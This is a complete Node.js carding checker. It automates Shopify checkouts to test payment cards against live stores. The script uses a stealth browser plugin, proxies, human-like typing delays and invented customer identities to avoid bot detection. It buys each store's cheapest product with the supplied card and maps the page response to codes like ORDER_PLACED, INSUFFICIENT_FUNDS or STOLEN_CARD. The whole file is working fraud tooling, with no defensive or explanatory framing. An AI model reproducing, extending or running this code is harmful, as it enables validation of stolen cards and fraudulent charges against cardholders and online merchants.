const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");

puppeteer.use(StealthPlugin());

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function humanDelay(min = 500, max = 1500) {
  return sleep(Math.floor(Math.random() * (max - min)) + min);
}

function parseCC(ccStr) {
  const parts = ccStr.trim().split(/[|\/\s]+/);
  if (parts.length !== 4) return null;
  let [number, month, year, cvv] = parts;
  if (year.length === 2) year = "20" + year;
  if (month.length === 1) month = "0" + month;
  return { number, month, year, cvv };
}

function parseProxy(proxyStr) {
  if (!proxyStr || proxyStr.trim() === "") return null;
  try {
    proxyStr = proxyStr.trim()
      .replace(/^https?:\/\//, "")
      .replace(/^socks5?:\/\//, "");
    let host, port, username, password;
    if (proxyStr.includes("@")) {
      const atIdx = proxyStr.lastIndexOf("@");
      const auth = proxyStr.substring(0, atIdx);
      const hostPort = proxyStr.substring(atIdx + 1);
      const authParts = auth.split(":");
      const hpParts = hostPort.split(":");
      username = authParts[0];
      password = authParts.slice(1).join(":");
      host = hpParts[0];
      port = hpParts[1] || "8080";
    } else {
      const parts = proxyStr.split(":");
      if (parts.length >= 4) {
        host = parts[0]; port = parts[1];
        username = parts[2]; password = parts.slice(3).join(":");
      } else if (parts.length === 2) {
        host = parts[0]; port = parts[1];
      } else return null;
    }
    if (!host || !port) return null;
    return { host, port, username: username || null, password: password || null };
  } catch (e) { return null; }
}

const FAKE_CUSTOMERS = [
  { firstName: "John", lastName: "Smith", email: "john.smith92@gmail.com", phone: "2125551234", address: "123 Main St", city: "New York", zip: "10001", state: "NY" },
  { firstName: "Emily", lastName: "Johnson", email: "emily.j1990@yahoo.com", phone: "3105559876", address: "456 Oak Ave", city: "Los Angeles", zip: "90001", state: "CA" },
  { firstName: "Michael", lastName: "Brown", email: "m.brown88@hotmail.com", phone: "7735554567", address: "789 Pine Rd", city: "Chicago", zip: "60601", state: "IL" },
  { firstName: "Sarah", lastName: "Davis", email: "sarah.davis@gmail.com", phone: "6175558901", address: "321 Elm St", city: "Boston", zip: "02101", state: "MA" },
  { firstName: "David", lastName: "Wilson", email: "d.wilson95@outlook.com", phone: "4155552345", address: "654 Maple Dr", city: "San Francisco", zip: "94101", state: "CA" },
];

function getFakeCustomer() {
  return FAKE_CUSTOMERS[Math.floor(Math.random() * FAKE_CUSTOMERS.length)];
}

// ==========================================
// GET CHEAPEST PRODUCT
// ==========================================
async function getCheapestProduct(site) {
  try {
    const url = site.endsWith("/")
      ? site + "products.json?limit=250"
      : site + "/products.json?limit=250";
    const res = await axios.get(url, {
      timeout: 10000,
      headers: {
        "User-Agent": "Mozilla/5.0",
        Accept: "application/json",
      },
    });
    const products = res.data?.products || [];
    if (products.length === 0) return null;
    let allVariants = [];
    products.forEach((p) => {
      p.variants?.forEach((v) => {
        allVariants.push({
          productTitle: p.title,
          variantId: v.id,
          price: parseFloat(v.price || "0"),
          available: v.available !== false,
        });
      });
    });
    const available = allVariants
      .filter((v) => v.available && v.price > 0)
      .sort((a, b) => a.price - b.price);
    return available[0] || allVariants[0] || null;
  } catch (e) {
    console.error("[PRODUCT] Error:", e.message);
    return null;
  }
}

// ==========================================
// DISMISS POPUPS
// ==========================================
async function dismissPopups(page) {
  try {
    await page.keyboard.press("Escape").catch(() => {});
    await sleep(300);
    await page.evaluate(() => {
      const sels = [
        '[class*="modal"]', '[class*="popup"]', '[class*="overlay"]',
        '[class*="backdrop"]', '[id*="modal"]', '[id*="popup"]',
        '[class*="newsletter"]', '[class*="cookie"]',
      ];
      sels.forEach((sel) => {
        document.querySelectorAll(sel).forEach((el) => {
          try {
            const style = window.getComputedStyle(el);
            if (
              (style.position === "fixed" || style.position === "absolute") &&
              parseInt(style.zIndex) > 50
            ) {
              el.style.display = "none";
            }
          } catch (e) {}
        });
      });
      document.body.style.overflow = "";
      document.documentElement.style.overflow = "";
    }).catch(() => {});
  } catch (e) {}
}

// ==========================================
// WAIT FOR SELECTOR SAFELY
// ==========================================
async function waitForAny(page, selectors, timeout = 5000) {
  for (const sel of selectors) {
    try {
      await page.waitForSelector(sel, { timeout });
      return sel;
    } catch (e) {}
  }
  return null;
}

// ==========================================
// TYPE IN FIELD
// ==========================================
async function typeInField(page, selectors, value) {
  for (const sel of selectors) {
    try {
      const el = await page.$(sel);
      if (el) {
        await page.evaluate((s) => {
          const el = document.querySelector(s);
          if (el) { el.value = ""; el.focus(); }
        }, sel);
        await sleep(100);
        await page.type(sel, value, { delay: 80 + Math.random() * 40 });
        return true;
      }
    } catch (e) {}
  }
  return false;
}

// ==========================================
// CLICK BUTTON
// ==========================================
async function clickButton(page, selectors) {
  for (const sel of selectors) {
    try {
      const btn = await page.$(sel);
      if (btn) {
        await btn.click();
        return true;
      }
    } catch (e) {}
  }
  return false;
}

// ==========================================
// SELECT SHIPPING METHOD
// ==========================================
async function selectShipping(page) {
  try {
    // Wait for shipping options
    await sleep(2000);
    const shippingSelectors = [
      'input[name="checkout[shipping_rate][id]"]',
      '.radio-wrapper input[type="radio"]',
      'input[type="radio"]',
    ];
    for (const sel of shippingSelectors) {
      try {
        const el = await page.$(sel);
        if (el) {
          await el.click();
          console.log(`[SHIPPING] Selected: ${sel}`);
          await sleep(1000);
          return true;
        }
      } catch (e) {}
    }
  } catch (e) {}
  return false;
}

// ==========================================
// FILL CONTACT STEP
// ==========================================
async function fillContact(page, customer) {
  console.log(`[STEP1] Filling contact...`);
  try {
    // Wait for email field
    const emailFound = await waitForAny(page, [
      '#email',
      '#checkout_email',
      'input[type="email"]',
      'input[autocomplete="email"]',
      'input[name="email"]',
    ], 8000);

    if (emailFound) {
      await typeInField(page, [emailFound], customer.email);
      await humanDelay(300, 500);
    }

    // First Name
    await typeInField(page, [
      '#firstName',
      '#checkout_shipping_address_first_name',
      'input[name="firstName"]',
      'input[autocomplete="given-name"]',
      'input[name="first_name"]',
    ], customer.firstName);

    // Last Name
    await typeInField(page, [
      '#lastName',
      '#checkout_shipping_address_last_name',
      'input[name="lastName"]',
      'input[autocomplete="family-name"]',
      'input[name="last_name"]',
    ], customer.lastName);

    await humanDelay(200, 400);

    // Address
    await typeInField(page, [
      '#address1',
      '#checkout_shipping_address_address1',
      'input[name="address1"]',
      'input[autocomplete="address-line1"]',
    ], customer.address);

    await humanDelay(500, 800);

    // Wait for address suggestions to dismiss
    await sleep(1000);
    await page.keyboard.press("Escape").catch(() => {});
    await sleep(500);

    // City
    await typeInField(page, [
      '#city',
      '#checkout_shipping_address_city',
      'input[name="city"]',
      'input[autocomplete="address-level2"]',
    ], customer.city);

    // ZIP
    await typeInField(page, [
      '#postalCode',
      '#zip',
      '#checkout_shipping_address_zip',
      'input[name="postalCode"]',
      'input[name="zip"]',
      'input[autocomplete="postal-code"]',
    ], customer.zip);

    await humanDelay(800, 1200);

    // Submit contact/shipping info
    console.log(`[STEP1] Submitting contact...`);
    await clickButton(page, [
      'button[type="submit"]',
      '#continue_button',
      '[data-testid="continue-button"]',
      'button[id*="continue"]',
      'input[type="submit"]',
    ]);

    // Wait for next step
    await humanDelay(3000, 4000);
    await dismissPopups(page);

    console.log(`[STEP1] Done. URL: ${page.url()}`);
  } catch (e) {
    console.error("[STEP1] Error:", e.message);
  }
}

// ==========================================
// FILL SHIPPING STEP
// ==========================================
async function fillShipping(page) {
  console.log(`[STEP2] Selecting shipping...`);
  try {
    await selectShipping(page);
    await humanDelay(1000, 1500);

    await clickButton(page, [
      'button[type="submit"]',
      '#continue_button',
      '[data-testid="continue-button"]',
      'button[id*="continue"]',
    ]);

    await humanDelay(3000, 4000);
    await dismissPopups(page);
    console.log(`[STEP2] Done. URL: ${page.url()}`);
  } catch (e) {
    console.error("[STEP2] Error:", e.message);
  }
}

// ==========================================
// FILL PAYMENT STEP
// ==========================================
async function fillPayment(page, cc, customer) {
  console.log(`[STEP3] Filling payment...`);
  try {
    await humanDelay(1000, 1500);

    // Log all frames
    const frames = page.frames();
    console.log(`[FRAMES] Total: ${frames.length}`);
    frames.forEach((f, i) => console.log(`  Frame ${i}: ${f.url()}`));

    // Find card iframe
    let cardFrame = null;
    for (const frame of frames) {
      const url = frame.url();
      if (
        url.includes("shopifycs.com") ||
        url.includes("pay.shopify") ||
        url.includes("checkout.shopify") ||
        url.includes("card-fields")
      ) {
        cardFrame = frame;
        console.log(`[CARD FRAME] Found: ${url}`);
        break;
      }
    }

    const target = cardFrame || page;

    // Log available inputs in target
    const inputs = await target.evaluate(() => {
      return Array.from(document.querySelectorAll("input")).map((i) => ({
        type: i.type, name: i.name, id: i.id,
        placeholder: i.placeholder, autocomplete: i.autocomplete,
      }));
    }).catch(() => []);
    console.log(`[INPUTS] In payment frame:`, JSON.stringify(inputs));

    // Card Number
    const numFilled = await typeInField(target, [
      'input[autocomplete="cc-number"]',
      'input[name="number"]',
      '#number',
      'input[id*="number"]',
      'input[placeholder*="Card"]',
      'input[placeholder*="card"]',
      'input[data-card-field="number"]',
    ], cc.number);
    console.log(`[CARD] Number filled: ${numFilled}`);
    await humanDelay(400, 700);

    // Expiry — Some sites use combined MM/YY field
    const expiryFilled = await typeInField(target, [
      'input[autocomplete="cc-exp"]',
      'input[name="expiry"]',
      'input[placeholder*="MM / YY"]',
      'input[placeholder*="MM/YY"]',
      'input[id*="expiry"]',
    ], `${cc.month}/${cc.year.slice(-2)}`);

    if (!expiryFilled) {
      // Try separate month/year fields
      await typeInField(target, [
        'input[autocomplete="cc-exp-month"]',
        'input[name="month"]',
        '#month',
      ], cc.month);
      await humanDelay(200, 400);
      await typeInField(target, [
        'input[autocomplete="cc-exp-year"]',
        'input[name="year"]',
        '#year',
      ], cc.year);
    }
    await humanDelay(200, 400);

    // CVV
    await typeInField(target, [
      'input[autocomplete="cc-csc"]',
      'input[name="verification_value"]',
      '#verification_value',
      'input[id*="cvv"]',
      'input[id*="cvc"]',
      'input[id*="security"]',
      'input[placeholder*="CVV"]',
      'input[placeholder*="CVC"]',
      'input[placeholder*="security"]',
    ], cc.cvv);
    await humanDelay(200, 400);

    // Name
    await typeInField(target, [
      'input[autocomplete="cc-name"]',
      'input[name="name"]',
      '#name',
      'input[placeholder*="Name on card"]',
      'input[placeholder*="name on card"]',
    ], `${customer.firstName} ${customer.lastName}`);

    console.log(`[STEP3] Card filled`);
    await humanDelay(800, 1200);

    // Submit payment
    await clickButton(page, [
      'button[type="submit"]',
      '#continue_button',
      '[data-testid="complete-order-button"]',
      '[data-testid="continue-button"]',
      'button[id*="pay"]',
      'button[class*="pay"]',
      'button[class*="Pay"]',
      'button[aria-label*="Pay"]',
      'button[aria-label*="Complete"]',
      'input[type="submit"]',
    ]);

    console.log(`[STEP3] Payment submitted`);
    await humanDelay(5000, 7000);

  } catch (e) {
    console.error("[STEP3] Error:", e.message);
  }
}

// ==========================================
// PARSE RESULT
// ==========================================
function parseResult(url, content) {
  const u = url.toLowerCase();
  const c = content.toLowerCase();

  if (
    u.includes("/thank_you") || u.includes("thank_you") ||
    u.includes("/orders/") ||
    c.includes("thank you for your order") ||
    c.includes("order confirmed") ||
    c.includes("your order is confirmed") ||
    c.includes("order is being processed")
  ) {
    return { Status: true, Response: "ORDER_PLACED", Gateway: "Shopify Payments", Price: 1.0 };
  }

  if (
    u.includes("3ds") || c.includes("3d secure") ||
    c.includes("authentication required") ||
    c.includes("verify your card")
  ) {
    return { Status: true, Response: "3D_SECURE_REQUIRED", Gateway: "Shopify Payments", Price: 1.0 };
  }

  const declines = [
    { k: "do not honor", r: "DO_NOT_HONOR" },
    { k: "insufficient funds", r: "INSUFFICIENT_FUNDS" },
    { k: "your card was declined", r: "CARD_DECLINED" },
    { k: "card was declined", r: "CARD_DECLINED" },
    { k: "invalid card number", r: "INVALID_CARD_NUMBER" },
    { k: "card number is invalid", r: "INVALID_CARD_NUMBER" },
    { k: "expired card", r: "EXPIRED_CARD" },
    { k: "card has expired", r: "EXPIRED_CARD" },
    { k: "incorrect cvc", r: "INCORRECT_CVV" },
    { k: "incorrect zip", r: "INCORRECT_ZIP" },
    { k: "stolen card", r: "STOLEN_CARD" },
    { k: "lost card", r: "LOST_CARD" },
    { k: "restricted card", r: "RESTRICTED_CARD" },
    { k: "security violation", r: "SECURITY_VIOLATION" },
    { k: "transaction not allowed", r: "TRANSACTION_NOT_ALLOWED" },
    { k: "generic decline", r: "GENERIC_DECLINE" },
    { k: "processing error", r: "PROCESSING_ERROR" },
    { k: "call your bank", r: "CALL_YOUR_BANK" },
    { k: "pickup card", r: "PICKUP_CARD" },
    { k: "blocked card", r: "BLOCKED_CARD" },
  ];

  for (const { k, r } of declines) {
    if (c.includes(k)) {
      return { Status: false, Response: r, Gateway: "Shopify Payments" };
    }
  }

  if (c.includes("declined") || c.includes("was declined")) {
    return { Status: false, Response: "DECLINED", Gateway: "Shopify Payments" };
  }

  if (u.includes("checkout")) {
    return { Status: false, Response: "CHECKOUT_INCOMPLETE", Gateway: "Shopify Payments" };
  }

  return { Status: false, Response: "UNKNOWN", Gateway: "Shopify Payments" };
}

// ==========================================
// MAIN CHECK FUNCTION
// ==========================================
async function checkShopify(site, ccStr, proxyStr) {
  const cc = parseCC(ccStr);
  if (!cc) return { Status: false, Response: "INVALID_CC_FORMAT", Gateway: "Shopify Payments" };

  const proxy = parseProxy(proxyStr);
  const customer = getFakeCustomer();
  if (!site.endsWith("/")) site += "/";

  console.log(`\n=============================`);
  console.log(`[CHECK] CC: ${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`);
  console.log(`[CHECK] Site: ${site}`);
  console.log(`[CHECK] Proxy: ${proxyStr || "None"}`);
  console.log(`[CHECK] Customer: ${customer.firstName} ${customer.lastName} / ${customer.email}`);

  // Get product
  const product = await getCheapestProduct(site);
  if (!product) return { Status: false, Response: "NO_PRODUCTS_FOUND", Gateway: "Shopify Payments" };
  console.log(`[PRODUCT] ${product.productTitle} — $${product.price} (ID: ${product.variantId})`);

  const launchArgs = [
    "--no-sandbox", "--disable-setuid-sandbox",
    "--disable-dev-shm-usage", "--disable-accelerated-2d-canvas",
    "--no-first-run", "--no-zygote", "--disable-gpu",
    "--disable-blink-features=AutomationControlled",
    "--disable-infobars", "--window-size=1366,768",
    "--disable-web-security",
    "--allow-running-insecure-content",
  ];

  if (proxy) {
    launchArgs.push(`--proxy-server=${proxy.host}:${proxy.port}`);
    console.log(`[PROXY] ${proxy.host}:${proxy.port}`);
  }

  let browser = null;
  try {
    browser = await puppeteer.launch({
      headless: "new",
      args: launchArgs,
      ignoreHTTPSErrors: true,
      timeout: 60000,
    });

    const page = await browser.newPage();

    if (proxy?.username && proxy?.password) {
      await page.authenticate({ username: proxy.username, password: proxy.password });
    }

    await page.setViewport({ width: 1366, height: 768 });
    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
    await page.setExtraHTTPHeaders({ "Accept-Language": "en-US,en;q=0.9" });

    // Block only images and media — keep CSS for proper rendering
    await page.setRequestInterception(true);
    page.on("request", (req) => {
      if (["image", "media"].includes(req.resourceType())) {
        req.abort();
      } else {
        req.continue();
      }
    });

    page.setDefaultTimeout(40000);
    page.setDefaultNavigationTimeout(40000);

    // ---- STEP 1: Visit Site ----
    console.log(`[NAV] Visiting site...`);
    await page.goto(site, { waitUntil: "networkidle2", timeout: 40000 });
    await humanDelay(1000, 1500);
    await dismissPopups(page);

    // ---- STEP 2: Add to Cart ----
    console.log(`[CART] Adding product ${product.variantId}...`);
    const cartResult = await page.evaluate(async (cartUrl, variantId) => {
      try {
        const res = await fetch(cartUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id: variantId, quantity: 1 }),
        });
        const data = await res.json();
        return { ok: res.ok, data };
      } catch (e) {
        return { ok: false, error: e.message };
      }
    }, site + "cart/add.js", product.variantId);
    console.log(`[CART] Result:`, JSON.stringify(cartResult));
    await humanDelay(800, 1200);

    // ---- STEP 3: Checkout ----
    console.log(`[NAV] Going to checkout...`);
    await page.goto(site + "checkout", { waitUntil: "networkidle2", timeout: 40000 });
    await humanDelay(2000, 3000);
    await dismissPopups(page);

    let currentUrl = page.url();
    console.log(`[NAV] Checkout URL: ${currentUrl}`);

    // ---- STEP 4: Fill Contact/Shipping ----
    await fillContact(page, customer);

    // ---- STEP 5: Fill Shipping Method ----
    currentUrl = page.url();
    console.log(`[NAV] After contact URL: ${currentUrl}`);
    if (currentUrl.includes("shipping") || currentUrl.includes("step=shipping")) {
      await fillShipping(page);
    } else {
      // Try anyway
      await selectShipping(page);
      await clickButton(page, [
        'button[type="submit"]', '#continue_button',
        '[data-testid="continue-button"]',
      ]);
      await humanDelay(2000, 3000);
    }

    // ---- STEP 6: Fill Payment ----
    currentUrl = page.url();
    console.log(`[NAV] Before payment URL: ${currentUrl}`);
    await fillPayment(page, cc, customer);

    // ---- STEP 7: Parse Result ----
    const finalUrl = page.url();
    const content = await page.content();
    const title = await page.title();

    console.log(`[FINAL] URL: ${finalUrl}`);
    console.log(`[FINAL] Title: ${title}`);

    const result = parseResult(finalUrl, content);
    console.log(`[RESULT] ${JSON.stringify(result)}`);

    await browser.close();
    return result;

  } catch (err) {
    console.error("[CHECKER] Fatal:", err.message);
    if (browser) try { await browser.close(); } catch (e) {}
    return { Status: false, Response: "ERROR: " + err.message, Gateway: "Shopify Payments" };
  }
}

module.exports = { checkShopify };
